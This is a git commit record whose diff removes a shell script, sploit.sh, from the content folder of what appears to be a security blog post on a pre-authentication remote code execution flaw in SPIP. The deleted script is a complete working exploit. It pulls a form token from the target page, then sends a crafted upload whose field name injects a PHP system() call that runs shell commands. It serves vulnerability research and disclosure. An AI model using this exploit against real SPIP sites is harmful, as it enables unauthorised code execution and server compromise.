307218d7c954a40114dd933bac78e702ec72811f
laluka <louka.jacques-chevallier@manomano.com>
2024-09-04 13:48:40 +0200

    draft 3 ok

--- content/hacking/spip-preauth-rce-2024-part-2-a-big-upload/sploit.sh
+++
@@ -1,7 +0,0 @@
-echo foo > foo.txt
-cmd="id; date"
-formulaire_action_args=$(curl -k 'http://127.0.0.1:8000/spip.php?page=spip_pass&lang=fr' | grep -F formulaire_action_args -C 3 | grep -ioP '[0-9a-zA-Z_/=+]{30,}')
-echo "formulaire_action_args: $formulaire_action_args"
-formulaire_action_args_encoded=$(python3 -c "import sys; from urllib.parse import quote; print(quote(sys.argv[1], safe=str()))" "$formulaire_action_args")
-echo "formulaire_action_args_encoded: $formulaire_action_args_encoded"
-curl -gv -ki -X POST "http://0.0.0.0:8000/spip.php?page=spip_pass&lang=fr&page=spip_pass&lang=fr&formulaire_action=oubli&formulaire_action_args=$formulaire_action_args_encoded&formulaire_action_sign=&oubli=foo%40foo.foo&nobot=&bigup_retrouver_fichiers=1" -F "RCE['.system('$cmd').die().'][][ll]=@foo.txt"
